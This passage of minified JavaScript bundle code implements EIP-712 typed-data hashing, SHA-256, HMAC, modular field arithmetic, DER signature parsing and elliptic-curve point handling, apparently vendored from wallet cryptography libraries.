                return function(e) {
                    return sx(e)
                }
            }
            return null
        }
        function Ej(e, t) {
            return "".concat(e, "(").concat(t.map((e => {
                let {name: t, type: r} = e;
                return r + " " + t
            }
            )).join(","), ")")
        }
        var Pj = new WeakMap
          , Cj = new WeakMap
          , Sj = new WeakMap
          , Ij = new WeakSet;
        class Bj {
            get types() {
                return JSON.parse(SS(Pj, this))
            }
            constructor(e) {
                DB(this, Ij),
                (0,
                CI.A)(this, "primaryType", void 0),
                ES(this, Pj, void 0),
                ES(this, Cj, void 0),
                ES(this, Sj, void 0),
                CS(Pj, this, JSON.stringify(e)),
                CS(Cj, this, new Map),
                CS(Sj, this, new Map);
                const t = new Map
                  , r = new Map
                  , n = new Map;
                Object.keys(e).forEach((e => {
                    t.set(e, new Set),
                    r.set(e, []),
                    n.set(e, new Set)
                }
                ));
                for (const i in e) {
                    const n = new Set;
                    for (const o of e[i]) {
                        NS(!n.has(o.name), "duplicate variable name ".concat(JSON.stringify(o.name), " in ").concat(JSON.stringify(i)), "types", e),
                        n.add(o.name);
                        const s = o.type.match(/^([^\x5b]*)(\x5b|$)/)[1] || null;
                        NS(s !== i, "circular type reference to ".concat(JSON.stringify(s)), "types", e);
                        Aj(s) || (NS(r.has(s), "unknown type ".concat(JSON.stringify(s)), "types", e),
                        r.get(s).push(i),
                        t.get(i).add(s))
                    }
                }
                const o = Array.from(r.keys()).filter((e => 0 === r.get(e).length));
                NS(0 !== o.length, "missing primary type", "types", e),
                NS(1 === o.length, "ambiguous primary types or unused types: ".concat(o.map((e => JSON.stringify(e))).join(", ")), "types", e),
                _S(this, {
                    primaryType: o[0]
                }),
                function o(i, s) {
                    NS(!s.has(i), "circular type reference to ".concat(JSON.stringify(i)), "types", e),
                    s.add(i);
                    for (const e of t.get(i))
                        if (r.has(e)) {
                            o(e, s);
                            for (const t of s)
                                n.get(t).add(e)
                        }
                    s.delete(i)
                }(this.primaryType, new Set);
                for (const [i,s] of n) {
                    const t = Array.from(s);
                    t.sort(),
                    SS(Cj, this).set(i, Ej(i, e[i]) + t.map((t => Ej(t, e[t]))).join(""))
                }
            }
            getEncoder(e) {
                let t = SS(Sj, this).get(e);
                return t || (t = PS(Ij, this, xj).call(this, e),
                SS(Sj, this).set(e, t)),
                t
            }
            encodeType(e) {
                const t = SS(Cj, this).get(e);
                return NS(t, "unknown type: ".concat(JSON.stringify(e)), "name", e),
                t
            }
            encodeData(e, t) {
                return this.getEncoder(e)(t)
            }
            hashStruct(e, t) {
                return ix(this.encodeData(e, t))
            }
            encode(e) {
                return this.encodeData(this.primaryType, e)
            }
            hash(e) {
                return this.hashStruct(this.primaryType, e)
            }
            _visit(e, t, r) {
                if (Aj(e))
                    return r(e, t);
                const n = e.match(/^(.*)(\x5b(\d*)\x5d)$/);
                if (n)
                    return NS(!n[3] || parseInt(n[3]) === t.length, "array length mismatch; expected length ".concat(parseInt(n[3])), "value", t),
                    t.map((e => this._visit(n[1], e, r)));
                const o = this.types[e];
                if (o)
                    return o.reduce(( (e, n) => {
                        let {name: o, type: i} = n;
                        return e[o] = this._visit(i, t[o], r),
                        e
                    }
                    ), {});
                NS(!1, "unknown type: ".concat(e), "type", e)
            }
            visit(e, t) {
                return this._visit(this.primaryType, e, t)
            }
            static from(e) {
                return new Bj(e)
            }
            static getPrimaryType(e) {
                return Bj.from(e).primaryType
            }
            static hashStruct(e, t, r) {
                return Bj.from(t).hashStruct(e, r)
            }
            static hashDomain(e) {
                const t = [];
                for (const r in e) {
                    if (null == e[r])
                        continue;
                    const n = bj[r];
                    NS(n, "invalid typed-data domain key: ".concat(JSON.stringify(r)), "domain", e),
                    t.push({
                        name: r,
                        type: n
                    })
                }
                return t.sort(( (e, t) => vj.indexOf(e.name) - vj.indexOf(t.name))),
                Bj.hashStruct("EIP712Domain", {
                    EIP712Domain: t
                }, e)
            }
            static encode(e, t, r) {
                return KS(["0x1901", Bj.hashDomain(e), Bj.from(t).hash(r)])
            }
            static hash(e, t, r) {
                return ix(Bj.encode(e, t, r))
            }
            static async resolveNames(e, t, r, n) {
                e = Object.assign({}, e);
                for (const s in e)
                    null == e[s] && delete e[s];
                const o = {};
                e.verifyingContract && !HS(e.verifyingContract, 20) && (o[e.verifyingContract] = "0x");
                const i = Bj.from(t);
                i.visit(r, ( (e, t) => ("address" !== e || HS(t, 20) || (o[t] = "0x"),
                t)));
                for (const s in o)
                    o[s] = await n(s);
                return e.verifyingContract && o[e.verifyingContract] && (e.verifyingContract = o[e.verifyingContract]),
                {
                    domain: e,
                    value: r = i.visit(r, ( (e, t) => "address" === e && o[t] ? o[t] : t))
                }
            }
            static getPayload(e, t, r) {
                Bj.hashDomain(e);
                const n = {}
                  , o = [];
                vj.forEach((t => {
                    const r = e[t];
                    null != r && (n[t] = Tj[t](r),
                    o.push({
                        name: t,
                        type: bj[t]
                    }))
                }
                ));
                const i = Bj.from(t)
                  , s = Object.assign({}, t);
                return NS(null == s.EIP712Domain, "types must not contain EIP712Domain type", "types.EIP712Domain", t),
                s.EIP712Domain = o,
                i.encode(r),
                {
                    types: s,
                    domain: n,
                    primaryType: i.primaryType,
                    message: i.visit(r, ( (e, t) => {
                        if (e.match(/^bytes(\d*)/))
                            return $S(zS(t));
                        if (e.match(/^u?int/))
                            return oI(t).toString();
                        switch (e) {
                        case "trcToken":
                            return oI(t).toString();
                        case "address":
                            return t.toLowerCase();
                        case "bool":
                            return !!t;
                        case "string":
                            return NS("string" === typeof t, "invalid string", "value", t),
                            t
                        }
                        NS(!1, "unsupported type", "type", e)
                    }
                    ))
                }
            }
        }
        function xj(e) {
            {
                const t = Aj(e);
                if (t)
                    return t
            }
            const t = e.match(/^(.*)(\x5b(\d*)\x5d)$/);
            if (t) {
                const e = t[1]
                  , r = this.getEncoder(e);
                return n => {
                    NS(!t[3] || parseInt(t[3]) === n.length, "array length mismatch; expected length ".concat(parseInt(t[3])), "value", n);
                    let o = n.map(r);
                    return SS(Cj, this).has(e) && (o = o.map(ix)),
                    ix(KS(o))
                }
            }
            const r = this.types[e];
            if (r) {
                const t = sx(SS(Cj, this).get(e));
                return e => {
                    const n = r.map((t => {
                        let {name: r, type: n} = t;
                        const o = this.getEncoder(n)(e[r]);
                        return SS(Cj, this).has(n) ? ix(o) : o
                    }
                    ));
                    return n.unshift(t),
                    KS(n)
                }
            }
            NS(!1, "unknown type: ".concat(e), "type", e)
        }
        function Oj(e) {
            if (!Number.isSafeInteger(e) || e < 0)
                throw new Error("positive integer expected, not ".concat(e))
        }
        function _j(e) {
            if (!function(e) {
                return e instanceof Uint8Array || null != e && "object" === typeof e && "Uint8Array" === e.constructor.name
            }(e))
                throw new Error("Uint8Array expected");
            for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                r[n - 1] = arguments[n];
            if (r.length > 0 && !r.includes(e.length))
                throw new Error("Uint8Array expected of length ".concat(r, ", not of length=").concat(e.length))
        }
        function Wj(e) {
            if ("function" !== typeof e || "function" !== typeof e.create)
                throw new Error("Hash should be wrapped by utils.wrapConstructor");
            Oj(e.outputLen),
            Oj(e.blockLen)
        }
        function Rj(e) {
            let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
            if (e.destroyed)
                throw new Error("Hash instance has been destroyed");
            if (t && e.finished)
                throw new Error("Hash#digest() has already been called")
        }
        function kj(e, t) {
            _j(e);
            const r = t.outputLen;
            if (e.length < r)
                throw new Error("digestInto() expects output buffer of length at least ".concat(r))
        }
        const Mj = "object" === typeof globalThis && "crypto"in globalThis ? globalThis.crypto : void 0;
        const Nj = e => new DataView(e.buffer,e.byteOffset,e.byteLength)
          , Fj = (e, t) => e << 32 - t | e >>> t;
        new Uint8Array(new Uint32Array([287454020]).buffer)[0];
        function Uj(e) {
            return "string" === typeof e && (e = function(e) {
                if ("string" !== typeof e)
                    throw new Error("utf8ToBytes expected string, got ".concat(typeof e));
                return new Uint8Array((new TextEncoder).encode(e))
            }(e)),
            _j(e),
            e
        }
        class Dj {
            clone() {
                return this._cloneInto()
            }
        }
        function Lj(e) {
            const t = t => e().update(Uj(t)).digest()
              , r = e();
            return t.outputLen = r.outputLen,
            t.blockLen = r.blockLen,
            t.create = () => e(),
            t
        }
        function jj() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32;
            if (Mj && "function" === typeof Mj.getRandomValues)
                return Mj.getRandomValues(new Uint8Array(e));
            throw new Error("crypto.getRandomValues must be defined")
        }
        const zj = (e, t, r) => e & t ^ ~e & r
          , Vj = (e, t, r) => e & t ^ e & r ^ t & r;
        class Hj extends Dj {
            constructor(e, t, r, n) {
                super(),
                this.blockLen = e,
                this.outputLen = t,
                this.padOffset = r,
                this.isLE = n,
                this.finished = !1,
                this.length = 0,
                this.pos = 0,
                this.destroyed = !1,
                this.buffer = new Uint8Array(e),
                this.view = Nj(this.buffer)
            }
            update(e) {
                Rj(this);
                const {view: t, buffer: r, blockLen: n} = this
                  , o = (e = Uj(e)).length;
                for (let i = 0; i < o; ) {
                    const s = Math.min(n - this.pos, o - i);
                    if (s !== n)
                        r.set(e.subarray(i, i + s), this.pos),
                        this.pos += s,
                        i += s,
                        this.pos === n && (this.process(t, 0),
                        this.pos = 0);
                    else {
                        const t = Nj(e);
                        for (; n <= o - i; i += n)
                            this.process(t, i)
                    }
                }
                return this.length += e.length,
                this.roundClean(),
                this
            }
            digestInto(e) {
                Rj(this),
                kj(e, this),
                this.finished = !0;
                const {buffer: t, view: r, blockLen: n, isLE: o} = this;
                let {pos: i} = this;
                t[i++] = 128,
                this.buffer.subarray(i).fill(0),
                this.padOffset > n - i && (this.process(r, 0),
                i = 0);
                for (let u = i; u < n; u++)
                    t[u] = 0;
                !function(e, t, r, n) {
                    if ("function" === typeof e.setBigUint64)
                        return e.setBigUint64(t, r, n);
                    const o = BigInt(32)
                      , i = BigInt(4294967295)
                      , s = Number(r >> o & i)
                      , a = Number(r & i)
                      , c = n ? 4 : 0
                      , l = n ? 0 : 4;
                    e.setUint32(t + c, s, n),
                    e.setUint32(t + l, a, n)
                }(r, n - 8, BigInt(8 * this.length), o),
                this.process(r, 0);
                const s = Nj(e)
                  , a = this.outputLen;
                if (a % 4)
                    throw new Error("_sha2: outputLen should be aligned to 32bit");
                const c = a / 4
                  , l = this.get();
                if (c > l.length)
                    throw new Error("_sha2: outputLen bigger than state");
                for (let u = 0; u < c; u++)
                    s.setUint32(4 * u, l[u], o)
            }
            digest() {
                const {buffer: e, outputLen: t} = this;
                this.digestInto(e);
                const r = e.slice(0, t);
                return this.destroy(),
                r
            }
            _cloneInto(e) {
                e || (e = new this.constructor),
                e.set(...this.get());
                const {blockLen: t, buffer: r, length: n, finished: o, destroyed: i, pos: s} = this;
                return e.length = n,
                e.pos = s,
                e.finished = o,
                e.destroyed = i,
                n % t && e.buffer.set(r),
                e
            }
        }
        const qj = new Uint32Array([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298])
          , Gj = new Uint32Array([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225])
          , $j = new Uint32Array(64);
        class Kj extends Hj {
            constructor() {
                super(64, 32, 8, !1),
                this.A = 0 | Gj[0],
                this.B = 0 | Gj[1],
                this.C = 0 | Gj[2],
                this.D = 0 | Gj[3],
                this.E = 0 | Gj[4],
                this.F = 0 | Gj[5],
                this.G = 0 | Gj[6],
                this.H = 0 | Gj[7]
            }
            get() {
                const {A: e, B: t, C: r, D: n, E: o, F: i, G: s, H: a} = this;
                return [e, t, r, n, o, i, s, a]
            }
            set(e, t, r, n, o, i, s, a) {
                this.A = 0 | e,
                this.B = 0 | t,
                this.C = 0 | r,
                this.D = 0 | n,
                this.E = 0 | o,
                this.F = 0 | i,
                this.G = 0 | s,
                this.H = 0 | a
            }
            process(e, t) {
                for (let u = 0; u < 16; u++,
                t += 4)
                    $j[u] = e.getUint32(t, !1);
                for (let u = 16; u < 64; u++) {
                    const e = $j[u - 15]
                      , t = $j[u - 2]
                      , r = Fj(e, 7) ^ Fj(e, 18) ^ e >>> 3
                      , n = Fj(t, 17) ^ Fj(t, 19) ^ t >>> 10;
                    $j[u] = n + $j[u - 7] + r + $j[u - 16] | 0
                }
                let {A: r, B: n, C: o, D: i, E: s, F: a, G: c, H: l} = this;
                for (let u = 0; u < 64; u++) {
                    const e = l + (Fj(s, 6) ^ Fj(s, 11) ^ Fj(s, 25)) + zj(s, a, c) + qj[u] + $j[u] | 0
                      , t = (Fj(r, 2) ^ Fj(r, 13) ^ Fj(r, 22)) + Vj(r, n, o) | 0;
                    l = c,
                    c = a,
                    a = s,
                    s = i + e | 0,
                    i = o,
                    o = n,
                    n = r,
                    r = e + t | 0
                }
                r = r + this.A | 0,
                n = n + this.B | 0,
                o = o + this.C | 0,
                i = i + this.D | 0,
                s = s + this.E | 0,
                a = a + this.F | 0,
                c = c + this.G | 0,
                l = l + this.H | 0,
                this.set(r, n, o, i, s, a, c, l)
            }
            roundClean() {
                $j.fill(0)
            }
            destroy() {
                this.set(0, 0, 0, 0, 0, 0, 0, 0),
                this.buffer.fill(0)
            }
        }
        const Zj = Lj(( () => new Kj));
        class Yj extends Dj {
            constructor(e, t) {
                super(),
                this.finished = !1,
                this.destroyed = !1,
                Wj(e);
                const r = Uj(t);
                if (this.iHash = e.create(),
                "function" !== typeof this.iHash.update)
                    throw new Error("Expected instance of class which extends utils.Hash");
                this.blockLen = this.iHash.blockLen,
                this.outputLen = this.iHash.outputLen;
                const n = this.blockLen
                  , o = new Uint8Array(n);
                o.set(r.length > n ? e.create().update(r).digest() : r);
                for (let i = 0; i < o.length; i++)
                    o[i] ^= 54;
                this.iHash.update(o),
                this.oHash = e.create();
                for (let i = 0; i < o.length; i++)
                    o[i] ^= 106;
                this.oHash.update(o),
                o.fill(0)
            }
            update(e) {
                return Rj(this),
                this.iHash.update(e),
                this
            }
            digestInto(e) {
                Rj(this),
                _j(e, this.outputLen),
                this.finished = !0,
                this.iHash.digestInto(e),
                this.oHash.update(e),
                this.oHash.digestInto(e),
                this.destroy()
            }
            digest() {
                const e = new Uint8Array(this.oHash.outputLen);
                return this.digestInto(e),
                e
            }
            _cloneInto(e) {
                e || (e = Object.create(Object.getPrototypeOf(this), {}));
                const {oHash: t, iHash: r, finished: n, destroyed: o, blockLen: i, outputLen: s} = this;
                return e.finished = n,
                e.destroyed = o,
                e.blockLen = i,
                e.outputLen = s,
                e.oHash = t._cloneInto(e.oHash),
                e.iHash = r._cloneInto(e.iHash),
                e
            }
            destroy() {
                this.destroyed = !0,
                this.oHash.destroy(),
                this.iHash.destroy()
            }
        }
        const Jj = (e, t, r) => new Yj(e,t).update(r).digest();
        Jj.create = (e, t) => new Yj(e,t);
        const Xj = BigInt(1)
          , Qj = BigInt(2);
        function ez(e) {
            return e instanceof Uint8Array || null != e && "object" === typeof e && "Uint8Array" === e.constructor.name
        }
        function tz(e) {
            if (!ez(e))
                throw new Error("Uint8Array expected")
        }
        const rz = Array.from({
            length: 256
        }, ( (e, t) => t.toString(16).padStart(2, "0")));
        function nz(e) {
            tz(e);
            let t = "";
            for (let r = 0; r < e.length; r++)
                t += rz[e[r]];
            return t
        }
        function oz(e) {
            if ("string" !== typeof e)
                throw new Error("hex string expected, got " + typeof e);
            return BigInt("" === e ? "0" : "0x".concat(e))
        }
        const iz = {
            _0: 48,
            _9: 57,
            _A: 65,
            _F: 70,
            _a: 97,
            _f: 102
        };
        function sz(e) {
            return e >= iz._0 && e <= iz._9 ? e - iz._0 : e >= iz._A && e <= iz._F ? e - (iz._A - 10) : e >= iz._a && e <= iz._f ? e - (iz._a - 10) : void 0
        }
        function az(e) {
            if ("string" !== typeof e)
                throw new Error("hex string expected, got " + typeof e);
            const t = e.length
              , r = t / 2;
            if (t % 2)
                throw new Error("padded hex string expected, got unpadded hex of length " + t);
            const n = new Uint8Array(r);
            for (let o = 0, i = 0; o < r; o++,
            i += 2) {
                const t = sz(e.charCodeAt(i))
                  , r = sz(e.charCodeAt(i + 1));
                if (void 0 === t || void 0 === r) {
                    const t = e[i] + e[i + 1];
                    throw new Error('hex string expected, got non-hex character "' + t + '" at index ' + i)
                }
                n[o] = 16 * t + r
            }
            return n
        }
        function cz(e) {
            return oz(nz(e))
        }
        function lz(e) {
            return tz(e),
            oz(nz(Uint8Array.from(e).reverse()))
        }
        function uz(e, t) {
            return az(e.toString(16).padStart(2 * t, "0"))
        }
        function dz(e, t) {
            return uz(e, t).reverse()
        }
        function hz(e, t, r) {
            let n;
            if ("string" === typeof t)
                try {
                    n = az(t)
                } catch (_l) {
                    throw new Error("".concat(e, ' must be valid hex string, got "').concat(t, '". Cause: ').concat(_l))
                }
            else {
                if (!ez(t))
                    throw new Error("".concat(e, " must be hex string or Uint8Array"));
                n = Uint8Array.from(t)
            }
            const o = n.length;
            if ("number" === typeof r && o !== r)
                throw new Error("".concat(e, " expected ").concat(r, " bytes, got ").concat(o));
            return n
        }
        function fz() {
            let e = 0;
            for (let r = 0; r < arguments.length; r++) {
                const t = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                tz(t),
                e += t.length
            }
            const t = new Uint8Array(e);
            for (let r = 0, n = 0; r < arguments.length; r++) {
                const e = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                t.set(e, n),
                n += e.length
            }
            return t
        }
        const pz = e => (Qj << BigInt(e - 1)) - Xj
          , gz = e => new Uint8Array(e)
          , yz = e => Uint8Array.from(e);
        function mz(e, t, r) {
            if ("number" !== typeof e || e < 2)
                throw new Error("hashLen must be a number");
            if ("number" !== typeof t || t < 2)
                throw new Error("qByteLen must be a number");
            if ("function" !== typeof r)
                throw new Error("hmacFn must be a function");
            let n = gz(e)
              , o = gz(e)
              , i = 0;
            const s = () => {
                n.fill(1),
                o.fill(0),
                i = 0
            }
              , a = function() {
                for (var e = arguments.length, t = new Array(e), i = 0; i < e; i++)
                    t[i] = arguments[i];
                return r(o, n, ...t)
            }
              , c = function() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : gz();
                o = a(yz([0]), e),
                n = a(),
                0 !== e.length && (o = a(yz([1]), e),
                n = a())
            }
              , l = () => {
                if (i++ >= 1e3)
                    throw new Error("drbg: tried 1000 values");
                let e = 0;
                const r = [];
                for (; e < t; ) {
                    n = a();
                    const t = n.slice();
                    r.push(t),
                    e += n.length
                }
                return fz(...r)
            }
            ;
            return (e, t) => {
                let r;
                for (s(),
                c(e); !(r = t(l())); )
                    c();
                return s(),
                r
            }
        }
        const bz = {
            bigint: e => "bigint" === typeof e,
            function: e => "function" === typeof e,
            boolean: e => "boolean" === typeof e,
            string: e => "string" === typeof e,
            stringOrUint8Array: e => "string" === typeof e || ez(e),
            isSafeInteger: e => Number.isSafeInteger(e),
            array: e => Array.isArray(e),
            field: (e, t) => t.Fp.isValid(e),
            hash: e => "function" === typeof e && Number.isSafeInteger(e.outputLen)
        };
        function vz(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
            const n = (t, r, n) => {
                const o = bz[r];
                if ("function" !== typeof o)
                    throw new Error('Invalid validator "'.concat(r, '", expected function'));
                const i = e[t];
                if ((!n || void 0 !== i) && !o(i, e))
                    throw new Error("Invalid param ".concat(String(t), "=").concat(i, " (").concat(typeof i, "), expected ").concat(r))
            }
            ;
            for (const [o,i] of Object.entries(t))
                n(o, i, !1);
            for (const [o,i] of Object.entries(r))
                n(o, i, !0);
            return e
        }
        const wz = BigInt(0)
          , Tz = BigInt(1)
          , Az = BigInt(2)
          , Ez = BigInt(3)
          , Pz = BigInt(4)
          , Cz = BigInt(5)
          , Sz = BigInt(8);
        BigInt(9),
        BigInt(16);
        function Iz(e, t) {
            const r = e % t;
            return r >= wz ? r : t + r
        }
        function Bz(e, t, r) {
            if (r <= wz || t < wz)
                throw new Error("Expected power/modulo > 0");
            if (r === Tz)
                return wz;
            let n = Tz;
            for (; t > wz; )
                t & Tz && (n = n * e % r),
                e = e * e % r,
                t >>= Tz;
            return n
        }
        function xz(e, t, r) {
            let n = e;
            for (; t-- > wz; )
                n *= n,
                n %= r;
            return n
        }
        function Oz(e, t) {
            if (e === wz || t <= wz)
                throw new Error("invert: expected positive integers, got n=".concat(e, " mod=").concat(t));
            let r = Iz(e, t)
              , n = t
              , o = wz
              , i = Tz
              , s = Tz
              , a = wz;
            for (; r !== wz; ) {
                const e = n / r
                  , t = n % r
                  , c = o - s * e
                  , l = i - a * e;
                n = r,
                r = t,
                o = s,
                i = a,
                s = c,
                a = l
            }
            if (n !== Tz)
                throw new Error("invert: does not exist");
            return Iz(o, t)
        }
        function _z(e) {
            if (e % Pz === Ez) {
                const t = (e + Tz) / Pz;
                return function(e, r) {
                    const n = e.pow(r, t);
                    if (!e.eql(e.sqr(n), r))
                        throw new Error("Cannot find square root");
                    return n
                }
            }
            if (e % Sz === Cz) {
                const t = (e - Cz) / Sz;
                return function(e, r) {
                    const n = e.mul(r, Az)
                      , o = e.pow(n, t)
                      , i = e.mul(r, o)
                      , s = e.mul(e.mul(i, Az), o)
                      , a = e.mul(i, e.sub(s, e.ONE));
                    if (!e.eql(e.sqr(a), r))
                        throw new Error("Cannot find square root");
                    return a
                }
            }
            return function(e) {
                const t = (e - Tz) / Az;
                let r, n, o;
                for (r = e - Tz,
                n = 0; r % Az === wz; r /= Az,
                n++)
                    ;
                for (o = Az; o < e && Bz(o, t, e) !== e - Tz; o++)
                    ;
                if (1 === n) {
                    const t = (e + Tz) / Pz;
                    return function(e, r) {
                        const n = e.pow(r, t);
                        if (!e.eql(e.sqr(n), r))
                            throw new Error("Cannot find square root");
                        return n
                    }
                }
                const i = (r + Tz) / Az;
                return function(e, s) {
                    if (e.pow(s, t) === e.neg(e.ONE))
                        throw new Error("Cannot find square root");
                    let a = n
                      , c = e.pow(e.mul(e.ONE, o), r)
                      , l = e.pow(s, i)
                      , u = e.pow(s, r);
                    for (; !e.eql(u, e.ONE); ) {
                        if (e.eql(u, e.ZERO))
                            return e.ZERO;
                        let t = 1;
                        for (let n = e.sqr(u); t < a && !e.eql(n, e.ONE); t++)
                            n = e.sqr(n);
                        const r = e.pow(c, Tz << BigInt(a - t - 1));
                        c = e.sqr(r),
                        l = e.mul(l, r),
                        u = e.mul(u, c),
                        a = t
                    }
                    return l
                }
            }(e)
        }
        const Wz = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];
        function Rz(e, t) {
            const r = void 0 !== t ? t : e.toString(2).length;
            return {
                nBitLength: r,
                nByteLength: Math.ceil(r / 8)
            }
        }
        function kz(e) {
            if ("bigint" !== typeof e)
                throw new Error("field order must be bigint");
            const t = e.toString(2).length;
            return Math.ceil(t / 8)
        }
        function Mz(e) {
            const t = kz(e);
            return t + Math.ceil(t / 2)
        }
        const Nz = BigInt(0)
          , Fz = BigInt(1);
        function Uz(e) {
            return vz(e.Fp, Wz.reduce(( (e, t) => (e[t] = "function",
            e)), {
                ORDER: "bigint",
                MASK: "bigint",
                BYTES: "isSafeInteger",
                BITS: "isSafeInteger"
            })),
            vz(e, {
                n: "bigint",
                h: "bigint",
                Gx: "field",
                Gy: "field"
            }, {
                nBitLength: "isSafeInteger",
                nByteLength: "isSafeInteger"
            }),
            Object.freeze((0,
            k.A)((0,
            k.A)((0,
            k.A)({}, Rz(e.n, e.nBitLength)), e), {
                p: e.Fp.ORDER
            }))
        }
        const {Ph: Dz, aT: Lz} = C
          , jz = {
            Err: class extends Error {
                constructor() {
                    super(arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "")
                }
            }
            ,
            _parseInt(e) {
                const {Err: t} = jz;
                if (e.length < 2 || 2 !== e[0])
                    throw new t("Invalid signature integer tag");
                const r = e[1]
                  , n = e.subarray(2, r + 2);
                if (!r || n.length !== r)
                    throw new t("Invalid signature integer: wrong length");
                if (128 & n[0])
                    throw new t("Invalid signature integer: negative");
                if (0 === n[0] && !(128 & n[1]))
                    throw new t("Invalid signature integer: unnecessary leading zero");
                return {
                    d: Dz(n),
                    l: e.subarray(r + 2)
                }
            },
            toSig(e) {
                const {Err: t} = jz
                  , r = "string" === typeof e ? Lz(e) : e;
                tz(r);
                let n = r.length;
                if (n < 2 || 48 != r[0])
                    throw new t("Invalid signature tag");
                if (r[1] !== n - 2)
                    throw new t("Invalid signature: incorrect length");
                const {d: o, l: i} = jz._parseInt(r.subarray(2))
                  , {d: s, l: a} = jz._parseInt(i);
                if (a.length)
                    throw new t("Invalid signature: left bytes after parsing");
                return {
                    r: o,
                    s: s
                }
            },
            hexFromSig(e) {
                const t = e => 8 & Number.parseInt(e[0], 16) ? "00" + e : e
                  , r = e => {
                    const t = e.toString(16);
                    return 1 & t.length ? "0".concat(t) : t
                }
                  , n = t(r(e.s))
                  , o = t(r(e.r))
                  , i = n.length / 2
                  , s = o.length / 2
                  , a = r(i)
                  , c = r(s);
                return "30".concat(r(s + i + 4), "02").concat(c).concat(o, "02").concat(a).concat(n)
            }
        }
          , zz = BigInt(0)
          , Vz = BigInt(1)
          , Hz = (BigInt(2),
        BigInt(3));
        BigInt(4);
        function qz(e) {
            const t = function(e) {
                const t = Uz(e);
                vz(t, {
                    a: "field",
                    b: "field"
                }, {
                    allowedPrivateKeyLengths: "array",
                    wrapPrivateKey: "boolean",
                    isTorsionFree: "function",
                    clearCofactor: "function",
                    allowInfinityPoint: "boolean",
                    fromBytes: "function",
                    toBytes: "function"
                });
                const {endo: r, Fp: n, a: o} = t;
                if (r) {
                    if (!n.eql(o, n.ZERO))
                        throw new Error("Endomorphism can only be defined for Koblitz curves that have a=0");
                    if ("object" !== typeof r || "bigint" !== typeof r.beta || "function" !== typeof r.splitScalar)
                        throw new Error("Expected endomorphism with beta: bigint and splitScalar: function")
                }
                return Object.freeze((0,
                k.A)({}, t))
            }(e)
              , {Fp: r} = t
              , n = t.toBytes || ( (e, t, n) => {
                const o = t.toAffine();
                return fz(Uint8Array.from([4]), r.toBytes(o.x), r.toBytes(o.y))
            }
            )
              , o = t.fromBytes || (e => {
                const t = e.subarray(1);
                return {
                    x: r.fromBytes(t.subarray(0, r.BYTES)),
                    y: r.fromBytes(t.subarray(r.BYTES, 2 * r.BYTES))
                }
            }
            );
            function i(e) {
                const {a: n, b: o} = t
                  , i = r.sqr(e)
                  , s = r.mul(i, e);
                return r.add(r.add(s, r.mul(e, n)), o)
            }
            if (!r.eql(r.sqr(t.Gy), i(t.Gx)))
                throw new Error("bad generator point: equation left != right");
            function s(e) {
                return "bigint" === typeof e && zz < e && e < t.n
            }
            function a(e) {
                if (!s(e))
                    throw new Error("Expected valid bigint: 0 < bigint < curve.n")
            }
            function c(e) {
                const {allowedPrivateKeyLengths: r, nByteLength: n, wrapPrivateKey: o, n: i} = t;
                if (r && "bigint" !== typeof e) {
                    if (ez(e) && (e = nz(e)),
                    "string" !== typeof e || !r.includes(e.length))
                        throw new Error("Invalid key");
                    e = e.padStart(2 * n, "0")
                }
                let s;
                try {
                    s = "bigint" === typeof e ? e : cz(hz("private key", e, n))
                } catch (c) {
                    throw new Error("private key must be ".concat(n, " bytes, hex or bigint, not ").concat(typeof e))
                }
                return o && (s = Iz(s, i)),
                a(s),
                s
            }
            const l = new Map;
            function u(e) {
                if (!(e instanceof d))
                    throw new Error("ProjectivePoint expected")
            }
            class d {
                constructor(e, t, n) {
                    if (this.px = e,
                    this.py = t,
                    this.pz = n,
                    null == e || !r.isValid(e))
                        throw new Error("x required");
                    if (null == t || !r.isValid(t))
                        throw new Error("y required");
                    if (null == n || !r.isValid(n))
                        throw new Error("z required")
                }
                static fromAffine(e) {
                    const {x: t, y: n} = e || {};
                    if (!e || !r.isValid(t) || !r.isValid(n))
                        throw new Error("invalid affine point");
                    if (e instanceof d)
                        throw new Error("projective point not allowed");
                    const o = e => r.eql(e, r.ZERO);
                    return o(t) && o(n) ? d.ZERO : new d(t,n,r.ONE)
                }
                get x() {
                    return this.toAffine().x
                }
                get y() {
                    return this.toAffine().y
                }
                static normalizeZ(e) {
                    const t = r.invertBatch(e.map((e => e.pz)));
                    return e.map(( (e, r) => e.toAffine(t[r]))).map(d.fromAffine)
                }
                static fromHex(e) {
                    const t = d.fromAffine(o(hz("pointHex", e)));
                    return t.assertValidity(),
                    t
                }
                static fromPrivateKey(e) {
                    return d.BASE.multiply(c(e))
                }
                _setWindowSize(e) {
                    this._WINDOW_SIZE = e,
                    l.delete(this)
                }
                assertValidity() {
                    if (this.is0()) {
                        if (t.allowInfinityPoint && !r.is0(this.py))
                            return;
                        throw new Error("bad point: ZERO")
                    }
                    const {x: e, y: n} = this.toAffine();
                    if (!r.isValid(e) || !r.isValid(n))
                        throw new Error("bad point: x or y not FE");
                    const o = r.sqr(n)
                      , s = i(e);
                    if (!r.eql(o, s))
                        throw new Error("bad point: equation left != right");
                    if (!this.isTorsionFree())
                        throw new Error("bad point: not in prime-order subgroup")
                }
                hasEvenY() {
                    const {y: e} = this.toAffine();
                    if (r.isOdd)
